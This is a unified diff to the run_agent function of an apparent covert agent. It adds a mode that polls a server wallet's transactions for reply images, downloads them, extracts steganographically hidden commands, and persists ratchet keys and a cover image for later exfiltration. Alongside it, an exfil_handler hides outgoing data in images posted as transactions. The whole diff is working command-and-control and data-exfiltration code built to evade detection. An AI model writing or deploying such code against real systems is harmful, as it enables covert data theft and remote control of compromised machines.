@@ -132,16 +132,18 @@ def run_agent(args):
     K_ratchet = agent_keys["K_ratchet"]
     K_exfil_ratchet = agent_keys["K_exfil_ratchet"]
     K_extract = agent_keys["K_extract"]
+    server_wallet = agent_keys["server_wallet"]
+    last_seen_txid = agent_keys["last_seen_txid"]
+    cover_path = agent_keys["cover_path"]
 
-    #Guard against unsupported watch mode
-    if args.bootstrap_url is None:
-        return -1
+    #Load persisted cover into shared state so the exfil handler can reuse it
+    shared_state["cover_path"] = cover_path if cover_path else None
 
     #Exfiltration handler closure with access to agent keys and state
     def exfil_handler(vm, data):
         # advance for next exfil in same VM run
         nonlocal K_exfil_ratchet  
-        
+
         #Check for a saved cover image
         logger.info("Exfil handler start")
 
@@ -184,16 +186,60 @@ def run_agent(args):
         #Update shared state
         shared_state["new_exfil_ratchet"] = new_exfil_ratchet
         return txid
+    
+    #Acquire the reply image: bootstrap fetch or wallet watch
+    logger.info("Step A, Image acquisition start")
 
-    #Download the bootstrap image
-    logger.info("Step A, Bootstrap image download start")
-
-    if args.mock:
-        image_bytes = shared_state["mock"].download_image(shared_state["txid"]) 
-        logger.info("Step A, Bootstrap image download Finished")
+    if args.bootstrap_url is not None:
+        #Bootstrap fetch from centralized platform URL
+        logger.info("Step A, Bootstrap image download start")
+        if args.mock:
+            image_bytes = shared_state["mock"].download_image(shared_state["txid"])
+            logger.info("Step A, Bootstrap image download Finished")
+        else:
+            image_bytes = requests.get(args.bootstrap_url, timeout=30).content
+            logger.info("Step A, Bootstrap image download Finished")
     else:
-        image_bytes = requests.get(args.bootstrap_url, timeout=30).content
-        logger.info("Step A, Bootstrap image download Finished")
+        #Watch mode: poll server wallet tx history for replies
+        logger.info("Step A, Watch wallet poll start")
+
+        if not server_wallet:
+            logger.info("Step A, No server wallet configured in keyfile")
+            return -1
+
+        if args.mock:
+            mock = shared_state.get("mock")
+            if mock is None:
+                logger.info("Step A, Mock instance not available, no replies")
+                return 0
+            txids = mock.get_wallet_transactions(server_wallet)
+        else:
+            txids = get_wallet_transactions(server_wallet)
+
+        #Filter out txids up to and including last_seen_txid
+        if last_seen_txid and last_seen_txid in txids:
+            idx = txids.index(last_seen_txid)
+            new_txids = txids[idx + 1:]
+        else:
+            new_txids = txids
+
+        if not new_txids:
+            logger.info("Step A, No new replies found")
+            return 0
+
+        #Process oldest new reply in chronological order (single-shot)
+        reply_txid = new_txids[0]
+        logger.info(f"Step A, Found reply txid {reply_txid}")
+
+        if args.mock:
+            image_bytes = shared_state["mock"].download_image(reply_txid)
+        else:
+            image_bytes = download_image(reply_txid)
+
+        last_seen_txid = reply_txid
+        logger.info("Step A, Watch image download Finished")
+
+    logger.info("Step A, Image acquisition finished")
 
     #Save downloaded bytes to a temp file
     logger.info("Step B, Bootstrap image stego extraction start")
@@ -235,7 +281,8 @@ def run_agent(args):
 
     #Advance and persist ratchet
     logger.info("Step E, Advance and persist ratchet start")
-    agent_save_agent_keys(args.keyfile, agent_new_ratchet, K_exfil_ratchet, K_extract)
+    agent_save_agent_keys(args.keyfile, agent_new_ratchet, K_exfil_ratchet, K_extract,
+                          last_seen_txid=last_seen_txid, cover_path=stego_path)
     logger.info("Step E, Advance and persist ratchet Finished")
 
     #Save received image for reuse as next exfil cover
